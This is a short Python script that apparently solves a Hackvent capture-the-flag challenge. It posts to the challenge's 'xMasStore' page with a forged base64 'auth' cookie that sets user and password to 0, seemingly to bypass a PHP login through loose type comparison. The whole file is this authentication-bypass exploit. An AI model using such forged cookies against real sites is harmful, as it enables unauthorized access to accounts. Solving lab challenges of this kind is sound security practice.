import requests
import base64


# the url 
url="http://hackvent.hacking-lab.com/xMasStore_wqbrGjHxxZ9YkbfiKiGC/index.php"

# create our cookie
cookiestring='{"user":0,"password":0}'
cookiestringb64=base64.b64encode(cookiestring)
cookies=dict(auth=cookiestringb64)

r=requests.post(url, cookies=cookies)

# print the response
print r.text

